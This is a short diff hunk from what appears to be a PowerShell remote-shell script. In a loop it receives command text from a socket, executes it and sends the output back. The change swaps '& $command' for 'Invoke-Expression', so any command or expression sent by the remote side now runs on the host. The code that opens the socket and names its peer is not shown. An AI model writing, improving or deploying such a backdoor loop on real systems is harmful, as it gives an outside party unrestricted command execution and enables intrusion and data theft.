@@ -7,7 +7,7 @@ while ( $true ) {
         $bytearray = [byte[]]::new($bytes)
         $socket.Receive($bytearray)
         $command = ( [char[]]$bytearray -join "" ).Trim()
-        $response = & $command | Out-String
+        $response = Invoke-Expression "$command | Out-String"
         $socket.Send( [char[]]$response )
     }
     Start-Sleep -Seconds 2
